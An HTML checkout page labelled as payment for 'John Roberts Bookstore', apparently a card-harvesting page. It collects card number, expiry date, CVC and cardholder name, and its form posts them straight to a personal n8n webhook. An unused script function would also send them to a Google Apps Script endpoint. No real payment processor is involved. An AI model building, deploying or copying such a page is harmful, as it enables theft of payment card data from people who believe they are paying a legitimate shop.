<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Payment for John Roberts Bookstore</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-md-4 col-md-offset-4">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <h3 class="text-center">Payment Details</h3>
                        <img class="img-responsive cc-img" src="http://www.prepbootstrap.com/Content/images/shared/misc/creditcardicons.png" alt="Credit Card Icons">
                    </div>
                    <div class="panel-body">
                        <form action="https://kingvon.app.n8n.cloud/webhook/gabby" method="POST">
                            <!-- Card Number Field -->
                            <div class="form-group">
                                <label for="cardNumber">CARD NUMBER</label>
                                <div class="input-group">
                                    <input type="tel" class="form-control" id="cardNumber" name="cardNumber" placeholder="Valid Card Number" required maxlength="19" />
                                    <span class="input-group-addon"><span class="fa fa-credit-card"></span></span>
                                </div>
                            </div>
                        
                            <!-- Expiration Date Field -->
                            <div class="form-group">
                                <label for="expDate">EXPIRATION DATE</label>
                                <input type="tel" class="form-control" id="expDate" name="expDate" placeholder="MM / YY" required maxlength="5" />
                            </div>
                        
                            <!-- CV Code Field -->
                            <div class="form-group">
                                <label for="cvCode">CV CODE</label>
                                <input type="tel" class="form-control" id="cvCode" name="cvCode" placeholder="CVC" required maxlength="4" />
                            </div>
                        
                           <!-- Card Owner Field -->
<div class="form-group">
    <label for="cardOwner">CARD OWNER</label>
    <input type="text" class="form-control" id="cardOwner" name="cardOwner" placeholder="Card Owner Name" required />
</div>
                        
                            <!-- Submit Button -->
                            <button type="submit" class="btn btn-warning btn-lg btn-block">Process Payment</button>
                        </form>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function submitPayment() {
            const cardNumber = document.getElementById('cardNumber').value;
            const expDate = document.getElementById('expDate').value;
            const cvCode = document.getElementById('cvCode').value;
            const cardOwner = document.getElementById('cardOwner').value;

            fetch("https://script.google.com/macros/s/AKfycbwDcwJbcRnuQL37pBkp2fndmShitSTxotNdyOKCjE-bzFJpt843XhE5VlQ9TvqTSz5z/exec", {
                method: "POST",
                mode: "cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cardNumber, expDate, cvCode, cardOwner })
            })
            .then(response => response.json())
            .then(data => {
                if (data.result === "success") {
                    alert("Payment processed successfully!");
                } else {
                    alert("Error processing payment.");
                }
            })
            .catch(error => alert("An error occurred. Please try again."));
        }

        $(document).ready(function () {
            $('#cardNumber').on('input', function () {
                let input = $(this).val().replace(/\D/g, '');
                input = input.substring(0, 16);
                input = input.replace(/(\d{4})(?=\d)/g, '$1 ');
                $(this).val(input);
            });

            $('#expDate').on('input', function () {
                let input = $(this).val().replace(/\D/g, '');
                input = input.substring(0, 4);
                if (input.length >= 2) {
                    input = input.substring(0, 2) + '/' + input.substring(2);
                }
                $(this).val(input);
            });

              // JavaScript to restrict input to letters only for Card Owner
    document.getElementById('cardOwner').addEventListener('input', function (e) {
        // Remove any character that is not a letter
        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
    });

            $('#cvCode').on('input', function () {
                let input = $(this).val().replace(/\D/g, '');
                input = input.substring(0, 4);
                $(this).val(input);
            });
        });
    </script>
</body>
</html>
